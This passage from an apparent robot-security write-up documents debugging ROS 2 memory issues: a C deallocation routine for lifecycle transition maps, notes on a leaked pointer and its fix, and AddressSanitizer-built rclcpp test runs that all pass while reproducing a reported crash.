    <span id="cb149-4"><a href="#cb149-4" aria-hidden="true" tabindex="-1"></a>  <span class="ex">const</span> rcutils_allocator_t <span class="pp">*</span> allocator<span class="kw">)</span></span>
    <span id="cb149-5"><a href="#cb149-5" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
    <span id="cb149-6"><a href="#cb149-6" aria-hidden="true" tabindex="-1"></a>  <span class="ex">rcl_ret_t</span> fcn_ret = RCL_RET_OK<span class="kw">;</span></span>
    <span id="cb149-7"><a href="#cb149-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb149-8"><a href="#cb149-8" aria-hidden="true" tabindex="-1"></a>  <span class="ex">//</span> free the primary states</span>
    <span id="cb149-9"><a href="#cb149-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">allocator-</span><span class="op">&gt;</span>deallocate<span class="er">(</span><span class="ex">transition_map-</span><span class="op">&gt;</span>states-<span class="op">&gt;</span>valid_transitions, allocator-<span class="op">&gt;</span>state<span class="kw">);</span></span>
    <span id="cb149-10"><a href="#cb149-10" aria-hidden="true" tabindex="-1"></a>  <span class="ex">allocator-</span><span class="op">&gt;</span>deallocate<span class="er">(</span><span class="ex">transition_map-</span><span class="op">&gt;</span>states, allocator-<span class="op">&gt;</span>state<span class="kw">);</span></span>
    <span id="cb149-11"><a href="#cb149-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">transition_map-</span><span class="op">&gt;</span>states = NULL<span class="kw">;</span></span>
    <span id="cb149-12"><a href="#cb149-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">//</span> free the tansitions</span>
    <span id="cb149-13"><a href="#cb149-13" aria-hidden="true" tabindex="-1"></a>  <span class="ex">allocator-</span><span class="op">&gt;</span>deallocate<span class="er">(</span><span class="ex">transition_map-</span><span class="op">&gt;</span>transitions, allocator-<span class="op">&gt;</span>state<span class="kw">);</span></span>
    <span id="cb149-14"><a href="#cb149-14" aria-hidden="true" tabindex="-1"></a>  <span class="ex">transition_map-</span><span class="op">&gt;</span>transitions = NULL<span class="kw">;</span></span>
    <span id="cb149-15"><a href="#cb149-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb149-16"><a href="#cb149-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="ex">fcn_ret</span><span class="kw">;</span></span>
    <span id="cb149-17"><a href="#cb149-17" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span></code></pre></div>
    <p>Does not really help very much. Memory remain the same, leaking the same. Let’s follow the pointer of <code>new_valid_transitions</code>: - <code>0x6080000305a0</code> when allocated - NULL when released</p>
    <p>See the following image:</p>
    <figure>
    <img src="background/images/2019/09/valid-transitions-dissapears.png" alt="valid_transitions dissapears!" /><figcaption aria-hidden="true">valid_transitions dissapears!</figcaption>
    </figure>
    <p>https://github.com/aliasrobotics/RVD/issues/333 fix.</p>
    <h5 id="remediation">Remediation</h5>
    <p>See https://github.com/aliasrobotics/RVD/issues/333</p>
    <h4 id="rclcpp-segv-on-unknown-address-httpsgithub.comaliasroboticsrvdissues166">rclcpp: SEGV on unknown address https://github.com/aliasrobotics/RVD/issues/166</h4>
    <p>Tried reproducing this issue but tests passed. Tried with all of them in the corresponding package:</p>
    <div class="sourceCode" id="cb150"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb150-1"><a href="#cb150-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/opt/ros2_ws/build-asan/rclcpp#</span> du <span class="at">-a</span><span class="kw">|</span><span class="fu">grep</span> <span class="st">&quot;\./test_&quot;</span> <span class="kw">|</span> <span class="fu">awk</span> <span class="st">&#39;{print $2}&#39;</span> <span class="kw">|</span> <span class="fu">bash</span></span>
    <span id="cb150-2"><a href="#cb150-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-3"><a href="#cb150-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 3 tests from 1 test case.</span>
    <span id="cb150-4"><a href="#cb150-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-5"><a href="#cb150-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 3 tests from TestNodeOptions</span>
    <span id="cb150-6"><a href="#cb150-6" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNodeOptions.ros_args_only</span></span>
    <span id="cb150-7"><a href="#cb150-7" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNodeOptions.ros_args_only</span> <span class="er">(</span><span class="ex">102</span> ms<span class="kw">)</span></span>
    <span id="cb150-8"><a href="#cb150-8" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNodeOptions.ros_args_and_non_ros_args</span></span>
    <span id="cb150-9"><a href="#cb150-9" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNodeOptions.ros_args_and_non_ros_args</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-10"><a href="#cb150-10" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNodeOptions.bad_ros_args</span></span>
    <span id="cb150-11"><a href="#cb150-11" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNodeOptions.bad_ros_args</span> <span class="er">(</span><span class="ex">6</span> ms<span class="kw">)</span></span>
    <span id="cb150-12"><a href="#cb150-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 3 tests from TestNodeOptions <span class="er">(</span><span class="ex">109</span> ms total<span class="kw">)</span></span>
    <span id="cb150-13"><a href="#cb150-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-14"><a href="#cb150-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-15"><a href="#cb150-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 3 tests from 1 test case ran. <span class="er">(</span><span class="ex">110</span> ms total<span class="kw">)</span></span>
    <span id="cb150-16"><a href="#cb150-16" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">3</span> tests.</span>
    <span id="cb150-17"><a href="#cb150-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-18"><a href="#cb150-18" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 14 tests from 1 test case.</span>
    <span id="cb150-19"><a href="#cb150-19" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-20"><a href="#cb150-20" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 14 tests from TestParameter</span>
    <span id="cb150-21"><a href="#cb150-21" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.not_set_variant</span></span>
    <span id="cb150-22"><a href="#cb150-22" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.not_set_variant</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
    <span id="cb150-23"><a href="#cb150-23" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.bool_variant</span></span>
    <span id="cb150-24"><a href="#cb150-24" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.bool_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-25"><a href="#cb150-25" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.integer_variant</span></span>
    <span id="cb150-26"><a href="#cb150-26" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.integer_variant</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-27"><a href="#cb150-27" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.long_integer_variant</span></span>
    <span id="cb150-28"><a href="#cb150-28" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.long_integer_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-29"><a href="#cb150-29" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.float_variant</span></span>
    <span id="cb150-30"><a href="#cb150-30" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.float_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-31"><a href="#cb150-31" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.double_variant</span></span>
    <span id="cb150-32"><a href="#cb150-32" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.double_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-33"><a href="#cb150-33" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.string_variant</span></span>
    <span id="cb150-34"><a href="#cb150-34" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.string_variant</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
    <span id="cb150-35"><a href="#cb150-35" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.byte_array_variant</span></span>
    <span id="cb150-36"><a href="#cb150-36" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.byte_array_variant</span> <span class="er">(</span><span class="ex">2</span> ms<span class="kw">)</span></span>
    <span id="cb150-37"><a href="#cb150-37" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.bool_array_variant</span></span>
    <span id="cb150-38"><a href="#cb150-38" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.bool_array_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-39"><a href="#cb150-39" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.integer_array_variant</span></span>
    <span id="cb150-40"><a href="#cb150-40" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.integer_array_variant</span> <span class="er">(</span><span class="ex">4</span> ms<span class="kw">)</span></span>
    <span id="cb150-41"><a href="#cb150-41" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.long_integer_array_variant</span></span>
    <span id="cb150-42"><a href="#cb150-42" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.long_integer_array_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-43"><a href="#cb150-43" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.float_array_variant</span></span>
    <span id="cb150-44"><a href="#cb150-44" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.float_array_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-45"><a href="#cb150-45" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.double_array_variant</span></span>
    <span id="cb150-46"><a href="#cb150-46" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.double_array_variant</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-47"><a href="#cb150-47" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestParameter.string_array_variant</span></span>
    <span id="cb150-48"><a href="#cb150-48" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestParameter.string_array_variant</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-49"><a href="#cb150-49" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 14 tests from TestParameter <span class="er">(</span><span class="ex">20</span> ms total<span class="kw">)</span></span>
    <span id="cb150-50"><a href="#cb150-50" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-51"><a href="#cb150-51" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-52"><a href="#cb150-52" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 14 tests from 1 test case ran. <span class="er">(</span><span class="ex">20</span> ms total<span class="kw">)</span></span>
    <span id="cb150-53"><a href="#cb150-53" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">14</span> tests.</span>
    <span id="cb150-54"><a href="#cb150-54" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-55"><a href="#cb150-55" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 10 tests from 1 test case.</span>
    <span id="cb150-56"><a href="#cb150-56" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-57"><a href="#cb150-57" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 10 tests from TestIntraProcessManager</span>
    <span id="cb150-58"><a href="#cb150-58" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.nominal</span></span>
    <span id="cb150-59"><a href="#cb150-59" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.nominal</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-60"><a href="#cb150-60" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.remove_publisher_before_trying_to_take</span></span>
    <span id="cb150-61"><a href="#cb150-61" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.remove_publisher_before_trying_to_take</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-62"><a href="#cb150-62" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.removed_subscription_affects_take</span></span>
    <span id="cb150-63"><a href="#cb150-63" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.removed_subscription_affects_take</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-64"><a href="#cb150-64" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.multiple_subscriptions_one_publisher</span></span>
    <span id="cb150-65"><a href="#cb150-65" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.multiple_subscriptions_one_publisher</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-66"><a href="#cb150-66" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.multiple_publishers_one_subscription</span></span>
    <span id="cb150-67"><a href="#cb150-67" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.multiple_publishers_one_subscription</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-68"><a href="#cb150-68" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.multiple_publishers_multiple_subscription</span></span>
    <span id="cb150-69"><a href="#cb150-69" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.multiple_publishers_multiple_subscription</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-70"><a href="#cb150-70" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.ring_buffer_displacement</span></span>
    <span id="cb150-71"><a href="#cb150-71" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.ring_buffer_displacement</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-72"><a href="#cb150-72" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.subscription_creation_race_condition</span></span>
    <span id="cb150-73"><a href="#cb150-73" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.subscription_creation_race_condition</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-74"><a href="#cb150-74" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.publisher_out_of_scope_take</span></span>
    <span id="cb150-75"><a href="#cb150-75" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.publisher_out_of_scope_take</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-76"><a href="#cb150-76" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestIntraProcessManager.publisher_out_of_scope_store</span></span>
    <span id="cb150-77"><a href="#cb150-77" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestIntraProcessManager.publisher_out_of_scope_store</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-78"><a href="#cb150-78" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 10 tests from TestIntraProcessManager <span class="er">(</span><span class="ex">8</span> ms total<span class="kw">)</span></span>
    <span id="cb150-79"><a href="#cb150-79" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-80"><a href="#cb150-80" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-81"><a href="#cb150-81" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 10 tests from 1 test case ran. <span class="er">(</span><span class="ex">9</span> ms total<span class="kw">)</span></span>
    <span id="cb150-82"><a href="#cb150-82" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">10</span> tests.</span>
    <span id="cb150-83"><a href="#cb150-83" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-84"><a href="#cb150-84" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 7 tests from 2 test cases.</span>
    <span id="cb150-85"><a href="#cb150-85" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-86"><a href="#cb150-86" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from TestFunctionTraits</span>
    <span id="cb150-87"><a href="#cb150-87" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFunctionTraits.arity</span></span>
    <span id="cb150-88"><a href="#cb150-88" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFunctionTraits.arity</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-89"><a href="#cb150-89" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFunctionTraits.argument_types</span></span>
    <span id="cb150-90"><a href="#cb150-90" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFunctionTraits.argument_types</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-91"><a href="#cb150-91" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFunctionTraits.check_arguments</span></span>
    <span id="cb150-92"><a href="#cb150-92" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFunctionTraits.check_arguments</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-93"><a href="#cb150-93" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFunctionTraits.same_arguments</span></span>
    <span id="cb150-94"><a href="#cb150-94" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFunctionTraits.same_arguments</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-95"><a href="#cb150-95" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFunctionTraits.return_type</span></span>
    <span id="cb150-96"><a href="#cb150-96" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFunctionTraits.return_type</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-97"><a href="#cb150-97" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestFunctionTraits.sfinae_match</span></span>
    <span id="cb150-98"><a href="#cb150-98" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestFunctionTraits.sfinae_match</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-99"><a href="#cb150-99" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from TestFunctionTraits <span class="er">(</span><span class="ex">2</span> ms total<span class="kw">)</span></span>
    <span id="cb150-100"><a href="#cb150-100" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-101"><a href="#cb150-101" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestMember</span>
    <span id="cb150-102"><a href="#cb150-102" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestMember.bind_member_functor</span></span>
    <span id="cb150-103"><a href="#cb150-103" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestMember.bind_member_functor</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-104"><a href="#cb150-104" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestMember <span class="er">(</span><span class="ex">0</span> ms total<span class="kw">)</span></span>
    <span id="cb150-105"><a href="#cb150-105" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-106"><a href="#cb150-106" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-107"><a href="#cb150-107" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 7 tests from 2 test cases ran. <span class="er">(</span><span class="ex">4</span> ms total<span class="kw">)</span></span>
    <span id="cb150-108"><a href="#cb150-108" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">7</span> tests.</span>
    <span id="cb150-109"><a href="#cb150-109" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-110"><a href="#cb150-110" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-111"><a href="#cb150-111" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-112"><a href="#cb150-112" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestCreateTimer</span>
    <span id="cb150-113"><a href="#cb150-113" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestCreateTimer.timer_executes</span></span>
    <span id="cb150-114"><a href="#cb150-114" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestCreateTimer.timer_executes</span> <span class="er">(</span><span class="ex">147</span> ms<span class="kw">)</span></span>
    <span id="cb150-115"><a href="#cb150-115" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestCreateTimer.call_with_node_wrapper_compiles</span></span>
    <span id="cb150-116"><a href="#cb150-116" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestCreateTimer.call_with_node_wrapper_compiles</span> <span class="er">(</span><span class="ex">52</span> ms<span class="kw">)</span></span>
    <span id="cb150-117"><a href="#cb150-117" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestCreateTimer <span class="er">(</span><span class="ex">199</span> ms total<span class="kw">)</span></span>
    <span id="cb150-118"><a href="#cb150-118" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-119"><a href="#cb150-119" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-120"><a href="#cb150-120" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">200</span> ms total<span class="kw">)</span></span>
    <span id="cb150-121"><a href="#cb150-121" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-122"><a href="#cb150-122" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-123"><a href="#cb150-123" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 2 tests from 1 test case.</span>
    <span id="cb150-124"><a href="#cb150-124" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-125"><a href="#cb150-125" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestWithDifferentNodeOptions/TestSubscriptionPublisherCount</span>
    <span id="cb150-126"><a href="#cb150-126" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestSubscriptionPublisherCount.increasing_and_decreasing_counts/one_context_test</span></span>
    <span id="cb150-127"><a href="#cb150-127" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-128"><a href="#cb150-128" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-129"><a href="#cb150-129" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-130"><a href="#cb150-130" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-131"><a href="#cb150-131" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestSubscriptionPublisherCount.increasing_and_decreasing_counts/one_context_test</span> <span class="er">(</span><span class="ex">8205</span> ms<span class="kw">)</span></span>
    <span id="cb150-132"><a href="#cb150-132" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestSubscriptionPublisherCount.increasing_and_decreasing_counts/two_contexts_test</span></span>
